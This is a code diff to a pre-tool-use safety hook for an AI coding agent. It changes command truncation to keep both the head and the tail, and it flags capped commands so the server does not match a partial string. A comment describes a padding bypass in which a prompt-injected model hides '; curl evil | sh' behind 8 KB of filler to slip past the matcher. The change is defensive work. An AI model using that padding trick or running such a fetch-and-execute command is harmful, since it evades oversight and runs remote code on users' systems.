@@ -71,6 +71,39 @@ export function capToolInput(
   return capped;
 }
 
+/** Marker spliced between the head and tail of an over-long command. */
+export const COMMAND_TRUNCATION_MARKER = "\n#...unbound: omitted...\n";
+
+/**
+ * Cap a command at `maxChars` while keeping **both ends**.
+ *
+ * Head-only truncation is a padding bypass: a prompt-injected model can put 8 KB of innocuous
+ * text first and `; curl evil | sh` last, and the matcher would only ever see the innocuous
+ * half while the tool still runs the whole thing. Keeping the tail means a pattern written
+ * against the dangerous part still fires.
+ *
+ * The marker deliberately contains newlines: JS `.` does not match `\n` without the `s` flag, so
+ * splicing cannot make an unrelated single-line pattern span the join and block a command that
+ * never contained the match.
+ */
+export function capCommand(
+  command: string,
+  maxChars = MAX_COMMAND_CHARS,
+): { command: string; truncated: boolean } {
+  if (command.length <= maxChars) return { command, truncated: false };
+
+  const budget = maxChars - COMMAND_TRUNCATION_MARKER.length;
+  // Degenerate cap (only reachable if MAX_COMMAND_CHARS is ever set tiny): fall back to a plain cut.
+  if (budget <= 1) return { command: command.slice(0, maxChars), truncated: true };
+
+  const headChars = Math.ceil(budget / 2);
+  const tailChars = budget - headChars;
+  return {
+    command: command.slice(0, headChars) + COMMAND_TRUNCATION_MARKER + command.slice(-tailChars),
+    truncated: true,
+  };
+}
+
 /** Assemble the §B1 body. Pure: same input, same output, no side effects. */
 export function buildPretoolPayload(input: PretoolPayloadInput): PretoolRequestBody {
   const metadata: Record<string, unknown> = {
@@ -80,11 +113,20 @@ export function buildPretoolPayload(input: PretoolPayloadInput): PretoolRequestB
   const filePath = resolveFilePath(input.toolName, input.toolInput, input.cwd);
   if (filePath !== undefined) metadata.file_path = filePath;
 
+  const capped = capCommand(input.command);
+  if (capped.truncated) {
+    // The server cannot tell a whole command from a capped one by looking at the string. Say so
+    // explicitly, so a future entry gate can choose to ask or deny rather than matching a
+    // partial command as if it were the command that will actually run.
+    metadata.command_truncated = true;
+    metadata.command_original_chars = input.command.length;
+  }
+
   const preToolUseData: PreToolUseData = {
     // Forwarded verbatim: Phase 7 registered the lowercase pi names, so title-casing means the
     // server never matches the tool and enforcement silently disappears.
     tool_name: input.toolName,
-    command: input.command.length > MAX_COMMAND_CHARS ? input.command.slice(0, MAX_COMMAND_CHARS) : input.command,
+    command: capped.command,
     metadata,
   };
   if (typeof input.toolUseId === "string" && input.toolUseId.length > 0) {
